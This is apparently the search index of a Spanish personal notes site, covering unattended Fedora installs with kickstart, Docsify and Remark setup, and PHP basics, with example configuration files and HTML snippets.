crypt,getpass;pw=getpass.getpass();print(crypt.crypt(pw) if (pw==getpass.getpass(\"Confirm: \")) else exit())' Editar iso Para editar la iso tenemos que montarla en el sistema o usar alg\u00fan programa como isomaster . Lo dejo al gusto. Editar archivo isolinux.cfg Este archivo se encuentra dentro de la iso, en la ruta /isolinux/isolinux.cfg y contiene el men\u00fa de inicio para la instalaci\u00f3n. Lo que hago es crear un nuevo label para indicar la instalaci\u00f3n desatendida. Copio el label de la instalaci\u00f3n normal y le a\u00f1ado al final la ruta donde se encontrara el archivo kickstart ks=cdrom:/isolinux/ks.cfg . label desatendida menu label ^Install desatendida Fedora 29 kernel vmlinuz append initrd=initrd.img inst.stage2=hd:LABEL=Fedora-WS-dvd-x86_64-29 ks=cdrom:/isolinux/kickstart.cfg label linux menu label ^Install Fedora 29 kernel vmlinuz append initrd=initrd.img inst.stage2=hd:LABEL=Fedora-WS-dvd-x86_64-29 quiet Insertar kickstart Ahora solo queda insertar el archivo kickstart.cfg en la ruta que he indicado dentro de la imagen /isolinux/kickstart.cfg y volver a montar la imagen.","title":"Kikstart"},{"location":"desatendidas/kikstart/#kickstart-es-solo-compatible-con-el-instalador-anaconda","text":"Para generar una imagen de una instalaci\u00f3n desatendida, primero hay que generar un archivo de los pasos a seguir en la instalaci\u00f3n, insertarlo en la imagen y modificar el menu de la imagen para que lo detecte.","title":"kickstart ( Es solo compatible con el instalador anaconda )"},{"location":"desatendidas/kikstart/#generar-pasos-de-instalacion","text":"Hay que generar un archivo con los pasos de la instalaci\u00f3n, lo llamare kicktart.cfg . Tenemos 2 maneras una aplicaci\u00f3n gr\u00e1fica en derivados de Red Had o manualmente. La aplicaci\u00f3n: Esta en los repositorios sudo dnf install -y system-config-kickstart . Es muy intuitiva solo hay que indicar lo que quieres, red, paswords, paquetes, modo de instalaci\u00f3n, etc.. al guardar genera el archivo que necesitamos. Manualmente: Pues tienes mas trabajo, pero tambi\u00e9n mas opciones, lo mejor es un combo de la aplicaci\u00f3n, y a\u00f1adirle alg\u00fan par\u00e1metro mas. Documentaci\u00f3n: wiki fedora kickstart docs","title":"Generar pasos de instalaci\u00f3n"},{"location":"desatendidas/kikstart/#ejemplo-archivo-kscfg","text":"#platform=x86, AMD64 o Intel EM64T #version=DEVEL # Install: tipo de instalacion url: netinst install url --url = \"ftp://ftp.cica.es/fedora/linux/releases/29/Workstation/x86_64/os\" # Keyboard layouts keyboard 'es' # Root password rootpw --iscrypted $6$dtciO6uRuALooO .4 $0 oFR1GxiI0W57fXywalmIKLtILbCSoeI2JqMuztbhq135NPnEzyq8O56RpwjLvAns5qx03KeI1kk7OrX4IuFE # user user --name = jorge --groups = wheel --iscrypted $6$dtciO6uRuALooO .4 $0 oFR1GxiI0W57fXywalmIKLtILbCSoeI2JqMuztbhq13 # network dhcp network --onboot yes --device eth0 --bootproto dhcp --noipv6 # System language lang es_ES.UTF-8 # Firewall configuration firewall --disabled # Reboot after installation reboot # System timezone timezone --utc Europe/Madrid # System authorization information authconfig --enableshadow --passalgo = sha512 --enablefingerprint # Modo de instalacion text #graphical firstboot --disable # SELinux configuration selinux --permissive # Que particiones borrar clearpart --all # Tabla de particiones part swap --fstype = \"swap\" --recommended part / --fstype = \"ext4\" --grow --size = 1 # System bootloader configuration bootloader --location = mbr --driveorder = vda --append = \"rhgb quiet\" # Que ejecutar al acabar la instalacion %post systemctl set-default graphical.target # por defecto arranque gr\u00e1fico dnf -y update dnf install -y nano dnf install -y grub-customizer %end # Paquetes que se instalaran en la instalacion %packages @base-x # x windows @gnome-desktop # Escritorio deseado %end Para encriptar las contrase\u00f1as manualmente: python3 -c 'import crypt,getpass;pw=getpass.getpass();print(crypt.crypt(pw) if (pw==getpass.getpass(\"Confirm: \")) else exit())'","title":"Ejemplo archivo ks.cfg"},{"location":"desatendidas/kikstart/#editar-iso","text":"Para editar la iso tenemos que montarla en el sistema o usar alg\u00fan programa como isomaster . Lo dejo al gusto.","title":"Editar iso"},{"location":"desatendidas/kikstart/#editar-archivo-isolinuxcfg","text":"Este archivo se encuentra dentro de la iso, en la ruta /isolinux/isolinux.cfg y contiene el men\u00fa de inicio para la instalaci\u00f3n. Lo que hago es crear un nuevo label para indicar la instalaci\u00f3n desatendida. Copio el label de la instalaci\u00f3n normal y le a\u00f1ado al final la ruta donde se encontrara el archivo kickstart ks=cdrom:/isolinux/ks.cfg . label desatendida menu label ^Install desatendida Fedora 29 kernel vmlinuz append initrd=initrd.img inst.stage2=hd:LABEL=Fedora-WS-dvd-x86_64-29 ks=cdrom:/isolinux/kickstart.cfg label linux menu label ^Install Fedora 29 kernel vmlinuz append initrd=initrd.img inst.stage2=hd:LABEL=Fedora-WS-dvd-x86_64-29 quiet","title":"Editar archivo isolinux.cfg"},{"location":"desatendidas/kikstart/#insertar-kickstart","text":"Ahora solo queda insertar el archivo kickstart.cfg en la ruta que he indicado dentro de la imagen /isolinux/kickstart.cfg y volver a montar la imagen.","title":"Insertar kickstart"},{"location":"generar_doc/docsify/","text":"Docsify Docsify es un magn\u00edfico sitio donde generar tu documentaci\u00f3n y colgarla en un servidor web rapidamente, de manera muy sencilla y con una agradable presentaci\u00f3n. docsify crea una web donde leera autom\u00e1ticamente tus archivos markdown y los mostrara con un menu lateral. P\u00e1gina oficial Docsify Iniciar docsify Existen dos maneras de iniciar Docsify, mediante npm o insertando el archivo index.html en el inicio de una carpeta. Se recomienda npm Iniciar desde npm (recomendado) Mediante esta opci\u00f3n tenemos que instalar docsify y luego iniciarlo. # instalar sudo npm i docsify-cli -g # iniciar en el directorio docs docsify init ./docs - Esto crea dos archivos en el directorio docs, index.html y un README.md. Previsualizaci\u00f3n del la web. docsify serve docs http://localhost:3000 Iniciar forma manual Para iniciar de forma manual simplemente copiar el siguiente c\u00f3digo en un archivo index.html e insertarlo en el directorio raiz de vuestra web. Inmediatamente empezara a leer los archivos .md que esten en el mismo nivel de directorio. <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < title > Document </ title > < meta http-equiv = \"X-UA-Compatible\" content = \"IE=edge,chrome=1\" /> < meta name = \"description\" content = \"Description\" > < meta name = \"viewport\" content = \"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\" > < link rel = \"stylesheet\" href = \"//unpkg.com/docsify/lib/themes/vue.css\" > </ head > < body > < div id = \"app\" ></ div > < script > window . $docsify = { name : '' , repo : '' } </ script > < script src = \"//unpkg.com/docsify/lib/docsify.min.js\" ></ script > </ body > </ html > Funcionamiento El funcionamiento consiste en un directorio donde tienes todos tus archivos .md y se muestran en la web en el men\u00fa lateral. El problema es cuando empiezas a tener mucha informaci\u00f3n y necesitas organizaci\u00f3n. docsify a pensado en ello y el orden es el siguiente. - En cada directorio abra un archivo _sidebar.md con el men\u00fa lateral y un README.md que iniciara ese directorio. Ejemplo: ./docs \u251c\u2500\u2500 README.md \u251c\u2500\u2500 _sidebar.md \u251c\u2500\u2500 Sistemas \u2502 \u251c\u2500\u2500 README.md \u2502 \u2514\u2500\u2500 _sidebar.md \u2514\u2500\u2500 Redes \u251c\u2500\u2500 README.md \u2514\u2500\u2500 _sidebar.md Despues en cada _sidebar.md te diriges a cada directorio mediante links. Ejemplo: - [ inicio ]( /README.md ) - [ Redes ]( /Redes/README.md ) - [ Sistemas ]( /Sistemas/README.md ) Si se inicia docsify teniendo mucha informaci\u00f3n, moriras del aburrimiento creando menus. Configurar presentaci\u00f3n Desde index.html hay reglas a configurar que son interesantes. Solo explicare las que me parecen mas interesantes y estoy utilizando en esta web actualmente. Todas las opciones name Nombre que saldra en encima del menu y redirijira al inicio. window . $docsify = { name : 'Jorge Pastor' }; repo A\u00f1ade tu repositorio en la esquina superior derecha. window . $docsify = { repo : 'https://github.com/Jorgepastorr/apuntes' }; loadsidebar Cargar los men\u00fas personalizados. window . $docsify = { // load from _sidebar.md loadSidebar : true , // load from summary.md loadSidebar : 'summary.md' }; subMaxLevel Nivel de headers que quieres que muestre el men\u00fa. window . $docsify = { subMaxLevel : 2 }; autoHeader Muestra el encabezado del markdown (El titulo principal). window . $docsify = { loadSidebar : true , autoHeader : true }; themeColor Color del tema, la variable se descrive a si misma. window . $docsify = { themeColor : 'purple' }; Plugins Los plugins son funciones adicionales muy interesantes algunas de ellas. Todos los plugins Buscar texto En la esquina superior izquieda inserta una barra de busqueda. < script > window . $docsify = { search : { maxAge : 86400000 , paths : 'auto' , placeholder : 'Search' , depht : 3 , noData : 'No Results!' } } < /script> < script src = \"//unpkg.com/docsify/lib/plugins/search.min.js\" >< /script> Copiado de c\u00f3digo En los cuadros de codigo a\u00f1ade un enlace de copiado rapido. < script src = \"//unpkg.com/docsify-copy-code\" >< /script> Zoom en im\u00e1genes Al clicar en una im\u00e1gen hace zoom. < script src = \"//unpkg.com/docsify/lib/plugins/zoom-image.min.js\" >< /script> Tabs doc de tabs Tabs es un plugin donde crea pesta\u00f1as en un recuadro de c\u00f3digo. <!-- tabs:start --> #### ** English ** Hello! #### ** French ** Bonjour! #### ** Italian ** Ciao! <!-- tabs:end --> Ejemplo: English Hello! French Bonjour! Italian Ciao! < script > window . $docsify = { tabs : { persist : true , // default sync : true , // default theme : 'classic' , // default tabComments : true , // default tabHeadings : true // } } < /script> < script src = \"//unpkg.com/prismjs/components/prism-bash.min.js\" >< /script> < script src = \"//unpkg.com/prismjs/components/prism-php.min.js\" >< /script> < script src = \"https://unpkg.com/docsify-tabs@1\" >< /script>","title":"Docsify"},{"location":"generar_doc/docsify/#docsify","text":"Docsify es un magn\u00edfico sitio donde generar tu documentaci\u00f3n y colgarla en un servidor web rapidamente, de manera muy sencilla y con una agradable presentaci\u00f3n. docsify crea una web donde leera autom\u00e1ticamente tus archivos markdown y los mostrara con un menu lateral. P\u00e1gina oficial Docsify","title":"Docsify"},{"location":"generar_doc/docsify/#iniciar-docsify","text":"Existen dos maneras de iniciar Docsify, mediante npm o insertando el archivo index.html en el inicio de una carpeta. Se recomienda npm","title":"Iniciar docsify"},{"location":"generar_doc/docsify/#iniciar-desde-npm-recomendado","text":"Mediante esta opci\u00f3n tenemos que instalar docsify y luego iniciarlo. # instalar sudo npm i docsify-cli -g # iniciar en el directorio docs docsify init ./docs - Esto crea dos archivos en el directorio docs, index.html y un README.md. Previsualizaci\u00f3n del la web. docsify serve docs http://localhost:3000","title":"Iniciar desde npm  (recomendado)"},{"location":"generar_doc/docsify/#iniciar-forma-manual","text":"Para iniciar de forma manual simplemente copiar el siguiente c\u00f3digo en un archivo index.html e insertarlo en el directorio raiz de vuestra web. Inmediatamente empezara a leer los archivos .md que esten en el mismo nivel de directorio. <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < title > Document </ title > < meta http-equiv = \"X-UA-Compatible\" content = \"IE=edge,chrome=1\" /> < meta name = \"description\" content = \"Description\" > < meta name = \"viewport\" content = \"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\" > < link rel = \"stylesheet\" href = \"//unpkg.com/docsify/lib/themes/vue.css\" > </ head > < body > < div id = \"app\" ></ div > < script > window . $docsify = { name : '' , repo : '' } </ script > < script src = \"//unpkg.com/docsify/lib/docsify.min.js\" ></ script > </ body > </ html >","title":"Iniciar forma manual"},{"location":"generar_doc/docsify/#funcionamiento","text":"El funcionamiento consiste en un directorio donde tienes todos tus archivos .md y se muestran en la web en el men\u00fa lateral. El problema es cuando empiezas a tener mucha informaci\u00f3n y necesitas organizaci\u00f3n. docsify a pensado en ello y el orden es el siguiente. - En cada directorio abra un archivo _sidebar.md con el men\u00fa lateral y un README.md que iniciara ese directorio. Ejemplo: ./docs \u251c\u2500\u2500 README.md \u251c\u2500\u2500 _sidebar.md \u251c\u2500\u2500 Sistemas \u2502 \u251c\u2500\u2500 README.md \u2502 \u2514\u2500\u2500 _sidebar.md \u2514\u2500\u2500 Redes \u251c\u2500\u2500 README.md \u2514\u2500\u2500 _sidebar.md Despues en cada _sidebar.md te diriges a cada directorio mediante links. Ejemplo: - [ inicio ]( /README.md ) - [ Redes ]( /Redes/README.md ) - [ Sistemas ]( /Sistemas/README.md ) Si se inicia docsify teniendo mucha informaci\u00f3n, moriras del aburrimiento creando menus.","title":"Funcionamiento"},{"location":"generar_doc/docsify/#configurar-presentacion","text":"Desde index.html hay reglas a configurar que son interesantes. Solo explicare las que me parecen mas interesantes y estoy utilizando en esta web actualmente. Todas las opciones","title":"Configurar presentaci\u00f3n"},{"location":"generar_doc/docsify/#name","text":"Nombre que saldra en encima del menu y redirijira al inicio. window . $docsify = { name : 'Jorge Pastor' };","title":"name"},{"location":"generar_doc/docsify/#repo","text":"A\u00f1ade tu repositorio en la esquina superior derecha. window . $docsify = { repo : 'https://github.com/Jorgepastorr/apuntes' };","title":"repo"},{"location":"generar_doc/docsify/#loadsidebar","text":"Cargar los men\u00fas personalizados. window . $docsify = { // load from _sidebar.md loadSidebar : true , // load from summary.md loadSidebar : 'summary.md' };","title":"loadsidebar"},{"location":"generar_doc/docsify/#submaxlevel","text":"Nivel de headers que quieres que muestre el men\u00fa. window . $docsify = { subMaxLevel : 2 };","title":"subMaxLevel"},{"location":"generar_doc/docsify/#autoheader","text":"Muestra el encabezado del markdown (El titulo principal). window . $docsify = { loadSidebar : true , autoHeader : true };","title":"autoHeader"},{"location":"generar_doc/docsify/#themecolor","text":"Color del tema, la variable se descrive a si misma. window . $docsify = { themeColor : 'purple' };","title":"themeColor"},{"location":"generar_doc/docsify/#plugins","text":"Los plugins son funciones adicionales muy interesantes algunas de ellas. Todos los plugins","title":"Plugins"},{"location":"generar_doc/docsify/#buscar-texto","text":"En la esquina superior izquieda inserta una barra de busqueda. < script > window . $docsify = { search : { maxAge : 86400000 , paths : 'auto' , placeholder : 'Search' , depht : 3 , noData : 'No Results!' } } < /script> < script src = \"//unpkg.com/docsify/lib/plugins/search.min.js\" >< /script>","title":"Buscar texto"},{"location":"generar_doc/docsify/#copiado-de-codigo","text":"En los cuadros de codigo a\u00f1ade un enlace de copiado rapido. < script src = \"//unpkg.com/docsify-copy-code\" >< /script>","title":"Copiado de c\u00f3digo"},{"location":"generar_doc/docsify/#zoom-en-imagenes","text":"Al clicar en una im\u00e1gen hace zoom. < script src = \"//unpkg.com/docsify/lib/plugins/zoom-image.min.js\" >< /script>","title":"Zoom en im\u00e1genes"},{"location":"generar_doc/docsify/#tabs","text":"doc de tabs Tabs es un plugin donde crea pesta\u00f1as en un recuadro de c\u00f3digo. <!-- tabs:start --> #### ** English ** Hello! #### ** French ** Bonjour! #### ** Italian ** Ciao! <!-- tabs:end --> Ejemplo:","title":"Tabs"},{"location":"generar_doc/docsify/#english","text":"Hello!","title":"English"},{"location":"generar_doc/docsify/#french","text":"Bonjour!","title":"French"},{"location":"generar_doc/docsify/#italian","text":"Ciao! < script > window . $docsify = { tabs : { persist : true , // default sync : true , // default theme : 'classic' , // default tabComments : true , // default tabHeadings : true // } } < /script> < script src = \"//unpkg.com/prismjs/components/prism-bash.min.js\" >< /script> < script src = \"//unpkg.com/prismjs/components/prism-php.min.js\" >< /script> < script src = \"https://unpkg.com/docsify-tabs@1\" >< /script>","title":"Italian"},{"location":"generar_doc/remark/","text":"Remark Ejemplo diapositiva con remark Diapositivas echas en markdown, rapido y facil. https://remarkjs.com https://github.com/gnab/remark https://github.com/gnab/remark/wiki/Formatting Introducci\u00f3n En las siguientes diapositivas muestro algunos ejemplos de sintaxis. - Remark es sorprendentemente f\u00e1cil de usar. - Puedes insertar estilos mediante html, css y js. - Utiliza el lenguaje de marcado ligero Markdown . Iniciar diapositivas. https://github.com/gnab/remark Lo \u00fanico que tenemos que hacer para empezar a crear diapositivas es copiar el c\u00f3digo html del readme.md del proyecto y empezar a escribir markdown en el mismo archivo entre el elemento textarea . <!DOCTYPE html> < html > < head > < title > Title </ title > < meta charset = \"utf-8\" > < style > @ import url ( https :// fonts . googleapis . com / css ? family = Yanone + Kaffeesatz ) ; @ import url ( https :// fonts . googleapis . com / css ? family = Droid + Serif : 400 , 700 , 400italic ) ; @ import url ( https :// fonts . googleapis . com / css ? family = Ubuntu + Mono : 400 , 700 , 400italic ) ; body { font-family : 'Droid Serif' ; } h1 , h2 , h3 { font-family : 'Yanone Kaffeesatz' ; font-weight : normal ; } . remark-code , . remark-inline-code { font-family : 'Ubuntu Mono' ; } </ style > </ head > < body > < textarea id = \"source\" > class: center, middle # Title --- # Agenda 1. Introduction 2. Deep-dive 3. ... --- # Introduction </ textarea > < script src = \"https://remarkjs.com/downloads/remark-latest.min.js\" > </ script > < script > var slideshow = remark . create (); </ script > </ body > </ html > O aun mejor la opci\u00f3n que me gusta m\u00e1s, modificar la siguiente l\u00ednea del c\u00f3digo html y escribir en un archivo markdown a parte. var slideshow = remark . create ({ sourceUrl : 'markdown.md' }); - De esta manera queda todo mas limpio y ordenado. configuraci\u00f3n index.html A parte hay alguna que otra configuraci\u00f3n mas como: ratio de visi\u00f3n 4:3 o 19:9. modo de navegaci\u00f3n entre diapositivas, permitir clics, scroll y touch que no se que es. formatear el listado de diapositivas, o quitarlo. < script > var slideshow = remark . create ({ sourceUrl : 'markdown.md' , // Set the slideshow display ratio // Default: '4:3' // Alternatives: '16:9', ... ratio : '4:3' , // Navigation options navigation : { // Enable or disable navigating using scroll // Default: true // Alternatives: false scroll : true , // Enable or disable navigation using touch // Default: true // Alternatives: false touch : true , // Enable or disable navigation using click // Default: false // Alternatives: true click : false }, // Customize slide number label, either using a format string.. slideNumberFormat : 'Slide %current% of %total%' , // .. or by using a format function //slideNumberFormat: function (current, total) { // return 'Slide ' + current + ' of ' + total; // }, // Enable or disable counting of incremental slides in the slide counting countIncrementalSlides : false , // Estilo en las cuadros de codigo highlightStyle : 'default' }); </ script > Hay alguna que otra m\u00e1s mirar en el enlace de la wiki si interesa. Css Por defecto trae configurado algunas clases css como el alineamiento. Texto alineado a la derecha con .right[texto] Texto alineado a la izquierda con .left[texto] texto centrado con .center[texto] ] texto en medio de la diapositiva class: center, middle colores .red[texto] Y alguna que otra m\u00e1s. siempre puedes asignar tu propio css en el archivo html y llamarlo desde markdown. Im\u00e1genes insertar im\u00e1genes de background. background-image: url(https://ruta/Super-Mario-Film.jpg) im\u00e1genes normales usamos markdown. ![descripcion](image.png) V\u00eddeos con un iframe de toda la vida: < iframe width = \"560\" height = \"315\" src = \"https://www.youtube.com/embed/5eLcHJLDlI8\" frameborder = \"0\" allow = \"encrypted-media\" allowfullscreen ></ iframe > o como en markdown: < video width = \"560\" height = \"420\" controls > < source src = \"{{ site.baseurl }}/assets/video_example.mp4\" type = \"video/mp4\" > </ video > Esta parte es igual que en markdown vamos. Herencia de diapositiva No tenemos que repetir dos diapositivas si usas el mismo contenido sucesivamente, con -- de separador entre diapositivas se clona la anterior. # Herencia de slide - bullet 1 -- - bullet 2 Soy una plantilla La plantilla es similar a -- con la diferencia que no tienen que ser las diapositivas sucesivas. - Se le asigna un name a la plantilla y luego se le llama con template: Sintaxis name: plantilla # Soy una plantilla --- template: plantilla e cogido la plantilla y e agregado texto. Mas herencias. Pues se ve que les gusta esto de heredar o clonar, como quieras llamarlo. - con layout: true inicias la herencia y hasta que le indicas false crea subsecciones. Sintaxis --- layout: true # Mas herencias. Pues se ve que les gusta esto de heredar o clonar, como quieras llamarlo. - con `layout: true` inicias la herencia y hasta que le indicas `false` crea subsecciones. --- ## Sub section 1 - Pues no se que poner --- ## Sub section 2 - Me e quedado sin ideas --- layout: false En este caso la diferencia es que las sub-secciones se remplazan. Redireccionamiento En la slide inicial se le a asignado name: inicio y el enlace anterior es un simple link [el inicio](#inicio) name: inicio # Title remark --- .... Contenido varias diapositivas .... --- # Redireccionamiento [el inicio](#inicio) Columnas Pues jugando un poco con css puedes hacer muchas cosas, como columnas etc.. css en el archivo html . left-column { color : #777 ; width : 20 % ; height : 92 % ; float : left ; } . left-column h2 : last-of-type , . left-column h3 : last-child { color : #000 ; } . right-column { width : 75 % ; float : right ; padding-top : 1 em ; } - Y te quedan 2 columnas de 20% y 75% que resulta muy curioso. c\u00f3digo en markdown --- .left-column[ ## Y esto? ] .right-column[ Pues jugando un poco con css pedes hacer muchas cosas, como columnas etc.. ```css contenido css ] --- .left-column[ ## Y esto? ## Sintaxis? ] .right-column[ ```remark contenido markdown ] --- Modo presentaci\u00f3n Modo presentaci\u00f3n tiene varias ventajas entre ellas los comentarios adicionales: Sintaxis Slide 1 content ??? Comentarios slide 1 --- Slide 2 content ??? Comentarios slide 2 - Estos comentarios no se ven en la presentacion estandar, pero si pulsas la tecla P se abre modo presentaci\u00f3n y los ves a la derecha. - Tambi\u00e9n esta la opci\u00f3n de clonar la presentaci\u00f3n con C y as\u00ed mostrar en dos pantallas 1 en el proyector y otra en la estandar. - Por ultimo siempre esta la tecla H para mostrar todas las opciones. Asignar clases Asignar clases a un diapositiva es muy \u00fatil a la hora de insertar estilos. Por ejemplo estas diapositivas la primera y la ultima utilizan el mismo c\u00f3digo css, por eso mismo le asigno la misma clase. --- class: center, middle, custom - De hecho hay tres: center y middle las trae por defecto remark. - custom es mi propio css incrustado en el html. . custom { background-color : #272822 ; color : #f3f3f3 ; } . custom a { color : #f92672 ; } Para mas informaci\u00f3n: https://remarkjs.com","title":"Remark"},{"location":"generar_doc/remark/#remark","text":"Ejemplo diapositiva con remark Diapositivas echas en markdown, rapido y facil. https://remarkjs.com https://github.com/gnab/remark https://github.com/gnab/remark/wiki/Formatting","title":"Remark"},{"location":"generar_doc/remark/#introduccion","text":"En las siguientes diapositivas muestro algunos ejemplos de sintaxis. - Remark es sorprendentemente f\u00e1cil de usar. - Puedes insertar estilos mediante html, css y js. - Utiliza el lenguaje de marcado ligero Markdown .","title":"Introducci\u00f3n"},{"location":"generar_doc/remark/#iniciar-diapositivas","text":"https://github.com/gnab/remark Lo \u00fanico que tenemos que hacer para empezar a crear diapositivas es copiar el c\u00f3digo html del readme.md del proyecto y empezar a escribir markdown en el mismo archivo entre el elemento textarea . <!DOCTYPE html> < html > < head > < title > Title </ title > < meta charset = \"utf-8\" > < style > @ import url ( https :// fonts . googleapis . com / css ? family = Yanone + Kaffeesatz ) ; @ import url ( https :// fonts . googleapis . com / css ? family = Droid + Serif : 400 , 700 , 400italic ) ; @ import url ( https :// fonts . googleapis . com / css ? family = Ubuntu + Mono : 400 , 700 , 400italic ) ; body { font-family : 'Droid Serif' ; } h1 , h2 , h3 { font-family : 'Yanone Kaffeesatz' ; font-weight : normal ; } . remark-code , . remark-inline-code { font-family : 'Ubuntu Mono' ; } </ style > </ head > < body > < textarea id = \"source\" > class: center, middle # Title --- # Agenda 1. Introduction 2. Deep-dive 3. ... --- # Introduction </ textarea > < script src = \"https://remarkjs.com/downloads/remark-latest.min.js\" > </ script > < script > var slideshow = remark . create (); </ script > </ body > </ html > O aun mejor la opci\u00f3n que me gusta m\u00e1s, modificar la siguiente l\u00ednea del c\u00f3digo html y escribir en un archivo markdown a parte. var slideshow = remark . create ({ sourceUrl : 'markdown.md' }); - De esta manera queda todo mas limpio y ordenado.","title":"Iniciar diapositivas."},{"location":"generar_doc/remark/#configuracion-indexhtml","text":"A parte hay alguna que otra configuraci\u00f3n mas como: ratio de visi\u00f3n 4:3 o 19:9. modo de navegaci\u00f3n entre diapositivas, permitir clics, scroll y touch que no se que es. formatear el listado de diapositivas, o quitarlo. < script > var slideshow = remark . create ({ sourceUrl : 'markdown.md' , // Set the slideshow display ratio // Default: '4:3' // Alternatives: '16:9', ... ratio : '4:3' , // Navigation options navigation : { // Enable or disable navigating using scroll // Default: true // Alternatives: false scroll : true , // Enable or disable navigation using touch // Default: true // Alternatives: false touch : true , // Enable or disable navigation using click // Default: false // Alternatives: true click : false }, // Customize slide number label, either using a format string.. slideNumberFormat : 'Slide %current% of %total%' , // .. or by using a format function //slideNumberFormat: function (current, total) { // return 'Slide ' + current + ' of ' + total; // }, // Enable or disable counting of incremental slides in the slide counting countIncrementalSlides : false , // Estilo en las cuadros de codigo highlightStyle : 'default' }); </ script > Hay alguna que otra m\u00e1s mirar en el enlace de la wiki si interesa.","title":"configuraci\u00f3n index.html"},{"location":"generar_doc/remark/#css","text":"Por defecto trae configurado algunas clases css como el alineamiento. Texto alineado a la derecha con .right[texto] Texto alineado a la izquierda con .left[texto] texto centrado con .center[texto] ] texto en medio de la diapositiva class: center, middle colores .red[texto] Y alguna que otra m\u00e1s. siempre puedes asignar tu propio css en el archivo html y llamarlo desde markdown.","title":"Css"},{"location":"generar_doc/remark/#imagenes","text":"insertar im\u00e1genes de background. background-image: url(https://ruta/Super-Mario-Film.jpg) im\u00e1genes normales usamos markdown. ![descripcion](image.png)","title":"Im\u00e1genes"},{"location":"generar_doc/remark/#videos","text":"con un iframe de toda la vida: < iframe width = \"560\" height = \"315\" src = \"https://www.youtube.com/embed/5eLcHJLDlI8\" frameborder = \"0\" allow = \"encrypted-media\" allowfullscreen ></ iframe > o como en markdown: < video width = \"560\" height = \"420\" controls > < source src = \"{{ site.baseurl }}/assets/video_example.mp4\" type = \"video/mp4\" > </ video > Esta parte es igual que en markdown vamos.","title":"V\u00eddeos"},{"location":"generar_doc/remark/#herencia-de-diapositiva","text":"No tenemos que repetir dos diapositivas si usas el mismo contenido sucesivamente, con -- de separador entre diapositivas se clona la anterior. # Herencia de slide - bullet 1 -- - bullet 2","title":"Herencia de diapositiva"},{"location":"generar_doc/remark/#soy-una-plantilla","text":"La plantilla es similar a -- con la diferencia que no tienen que ser las diapositivas sucesivas. - Se le asigna un name a la plantilla y luego se le llama con template: Sintaxis","title":"Soy una plantilla"},{"location":"generar_doc/remark/#name-plantilla-soy-una-plantilla-template-plantilla-e-cogido-la-plantilla-y-e-agregado-texto","text":"","title":"name: plantilla\n\n# Soy una plantilla   \n\n---\ntemplate: plantilla\n\ne cogido la plantilla y e agregado texto.\n"},{"location":"generar_doc/remark/#mas-herencias","text":"Pues se ve que les gusta esto de heredar o clonar, como quieras llamarlo. - con layout: true inicias la herencia y hasta que le indicas false crea subsecciones. Sintaxis --- layout: true # Mas herencias. Pues se ve que les gusta esto de heredar o clonar, como quieras llamarlo. - con `layout: true` inicias la herencia y hasta que le indicas `false` crea subsecciones. --- ## Sub section 1 - Pues no se que poner --- ## Sub section 2 - Me e quedado sin ideas --- layout: false En este caso la diferencia es que las sub-secciones se remplazan.","title":"Mas herencias."},{"location":"generar_doc/remark/#redireccionamiento","text":"En la slide inicial se le a asignado name: inicio y el enlace anterior es un simple link [el inicio](#inicio) name: inicio # Title remark --- .... Contenido varias diapositivas .... --- # Redireccionamiento [el inicio](#inicio)","title":"Redireccionamiento"},{"location":"generar_doc/remark/#columnas","text":"Pues jugando un poco con css puedes hacer muchas cosas, como columnas etc.. css en el archivo html . left-column { color : #777 ; width : 20 % ; height : 92 % ; float : left ; } . left-column h2 : last-of-type , . left-column h3 : last-child { color : #000 ; } . right-column { width : 75 % ; float : right ; padding-top : 1 em ; } - Y te quedan 2 columnas de 20% y 75% que resulta muy curioso. c\u00f3digo en markdown","title":"Columnas"},{"location":"generar_doc/remark/#-left-column-y-esto-right-column-pues-jugando-un-poco-con-css-pedes-hacer-muchas-cosas-como-columnas-etc-css-contenido-css-left-column-y-esto-sintaxis-right-column-remark-contenido-markdown-","text":"","title":"---\n\n.left-column[\n  ## Y esto?\n]\n.right-column[\n  Pues jugando un poco con css pedes hacer muchas cosas, como columnas etc..\n  ```css\n  contenido css    \n]\n---\n.left-column[\n  ## Y esto?\n  ## Sintaxis?\n]\n.right-column[\n  ```remark\n  contenido markdown\n]\n---\n"},{"location":"generar_doc/remark/#modo-presentacion","text":"Modo presentaci\u00f3n tiene varias ventajas entre ellas los comentarios adicionales: Sintaxis Slide 1 content ??? Comentarios slide 1 --- Slide 2 content ??? Comentarios slide 2 - Estos comentarios no se ven en la presentacion estandar, pero si pulsas la tecla P se abre modo presentaci\u00f3n y los ves a la derecha. - Tambi\u00e9n esta la opci\u00f3n de clonar la presentaci\u00f3n con C y as\u00ed mostrar en dos pantallas 1 en el proyector y otra en la estandar. - Por ultimo siempre esta la tecla H para mostrar todas las opciones.","title":"Modo presentaci\u00f3n"},{"location":"generar_doc/remark/#asignar-clases","text":"Asignar clases a un diapositiva es muy \u00fatil a la hora de insertar estilos. Por ejemplo estas diapositivas la primera y la ultima utilizan el mismo c\u00f3digo css, por eso mismo le asigno la misma clase. --- class: center, middle, custom - De hecho hay tres: center y middle las trae por defecto remark. - custom es mi propio css incrustado en el html. . custom { background-color : #272822 ; color : #f3f3f3 ; } . custom a { color : #f92672 ; }","title":"Asignar clases"},{"location":"generar_doc/remark/#para-mas-informacion","text":"https://remarkjs.com","title":"Para mas informaci\u00f3n:"},{"location":"lenguajes/Fundamentos_php/","text":"Fundamentos php Variables <?php // variables //String $nombre = \"Jorge\" ; // integrer $numero = 7 ; //double $decimal = 7.7 ; //bolean (true/false) $verdadero = true ; // concatenar con . \"punto\" echo 'Hola, ' . $nombre ; // gettype muestra tipo de variables echo gettype ( $nombre ); ?> Valor variables <?php $num = 6 ; $num2 = '5' ; $texto = 'hola' ; $diccionario = array ( 'nombre' => 'jorge' , 'edad' => 30 ); $lista = array ( 'pedro' , 'juan' , 'silvia' ); $boleano = true ; echo \"Numero normal <br/>\" ; var_dump ( $num ); echo \"<br/><br/> numero en String <br/>\" ; var_dump ( $num2 ); echo \"<br/><br/> Texto <br/>\" ; var_dump ( $texto ); echo \"<br/><br/> boleano <br/>\" ; var_dump ( $boleano ); echo \"<br/><br/> boleano print_r debuelve false 0 o true 1<br/>\" ; print_r ( $boleano ); // utilizando pre a\u00f1adimos la salida literal en este caso algo mqas claro echo \"<br/><br/> diccionario <br/>\" ; echo \"<pre>\" ; 